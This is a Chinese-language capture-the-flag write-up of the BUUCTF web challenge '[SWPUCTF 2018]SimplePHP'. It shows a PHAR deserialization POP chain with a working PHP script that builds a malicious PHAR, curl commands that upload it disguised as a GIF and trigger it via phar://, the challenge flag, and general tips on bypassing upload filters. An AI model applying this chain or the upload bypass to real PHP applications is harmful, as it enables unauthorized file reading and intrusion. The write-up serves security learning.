---
title: "[SWPUCTF 2018]SimplePHP"
platform: BUUCTF
category: Web
difficulty: 中等
tags: [php-deserialization, phar, pop-chain, file-upload]
vulnerability: PHAR 反序列化 + POP 链绕过黑名单读取文件
solved: true
flag: "flag{636082c0-56ae-4b7b-9a04-db257533b81f}"
---

# [SWPUCTF 2018]SimplePHP

## 题目概述
题目是一个 PHP 文件管理系统，包含文件查看和文件上传功能。首页注释提示 `flag is in f1ag.php`，但直接访问被黑名单过滤。

## 信息收集
1. 访问首页，发现两个功能入口：
   - `file.php?file=` - 查看文件
   - `upload_file.php` - 上传文件

2. 通过 `file.php` 读取源码：
   - `file.php` - 包含 `function.php` 和 `class.php`
   - `function.php` - 文件上传逻辑，后缀检查白名单 `gif/jpeg/jpg/png`
   - `class.php` - 三个类：`C1e4r`、`Show`、`Test`

3. 关键发现：
   - `file.php` 使用 `file_exists($file)` 检查文件存在性
   - `file_exists()` 支持 PHAR 协议，可触发反序列化
   - `_show()` 方法过滤了 `f1ag` 关键词，但反序列化链可以绕过

## 漏洞分析（漏洞类型、原理、判断过程）

### POP 链构造
```
C1e4r::__destruct() 
  → $this->test = $this->str; echo $this->test;
  → Show::__toString()
  → $this->str['str']->source (访问不存在的属性)
  → Test::__get('source')
  → get('source') → file_get($this->params['source'])
  → file_get_contents() + base64_encode()
```

### 关键魔术方法
| 类 | 方法 | 触发条件 |
|---|---|---|
| C1e4r | `__destruct()` | 对象销毁时，echo $this->test 触发 __toString |
| Show | `__toString()` | 访问 $this->str['str']->source 触发 __get |
| Test | `__get($key)` | 访问不存在的属性，调用 file_get_contents |

### 绕过方式
- `_show()` 黑名单过滤 `f1ag`，但反序列化通过 `Test::file_get()` 直接读取文件
- 结果 base64 编码输出，绕过关键词检测

## 利用过程（Payload + Flag）

### 1. 生成 PHAR 文件
```php
<?php
class C1e4r { public $test; public $str; }
class Show { public $source; public $str; }
class Test { public $file; public $params; }

$c = new C1e4r();
$s = new Show();
$t = new Test();

$t->params = array('source' => '/var/www/html/f1ag.php');
$s->str = array('str' => $t);
$c->str = $s;

$phar = new Phar('exp.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($c);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
```

### 2. 上传 PHAR 文件
```bash
curl -X POST "$URL/upload_file.php" -F "file=@exp.phar;filename=exp.gif"
```

### 3. 触发反序列化
```bash
# 文件名 = md5("exp.gif" + 客户端IP) + ".jpg"
curl "$URL/file.php?file=phar://upload/b21ac2f6bd1e6b82b49e0ee6e2f6e074.jpg"
```

### 4. 解码获取 Flag
```bash
echo "PD9waHAgDQoJLy8kYSA9ICdmbGFnezYzNjA4MmMwLTU2YWUtNGI3Yi05YTA0LWRiMjU3NTMzYjgxZn0nOw0KID8+DQoNCg==" | base64 -d
# <?php //$a = 'flag{636082c0-56ae-4b7b-9a04-db257533b81f}'; ?>
```

**Flag: `flag{636082c0-56ae-4b7b-9a04-db257533b81f}`**

## 复现步骤
1. 读取源码分析 POP 链
2. 本地生成包含恶意序列化数据的 PHAR 文件
3. 将 PHAR 伪装成图片上传
4. 使用 `phar://` 协议触发反序列化
5. Base64 解码响应获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| PHAR 反序列化 | file_exists() + phar:// | `phar://upload/xxx.jpg` | PHAR 文件结构、POP 链构造 |
| 文件上传绕过 | 白名单检查 | 修改 filename 为 .gif 后缀 | 文件类型检测绕过 |

## 知识总结（解题技巧、同类题型套路）

1. **PHAR 反序列化触发点**：`file_exists()`、`is_file()`、`is_dir()`、`file_get_contents()` 等文件操作函数都支持 PHAR 协议

2. **POP 链构造技巧**：
   - 从 `__destruct()` / `__wakeup()` 入手
   - 寻找 `echo` / `print` 触发 `__toString()`
   - 寻找属性访问触发 `__get()` / `__set()`

3. **绕过黑名单**：反序列化可以执行任意代码逻辑，绕过正则过滤直接读取文件
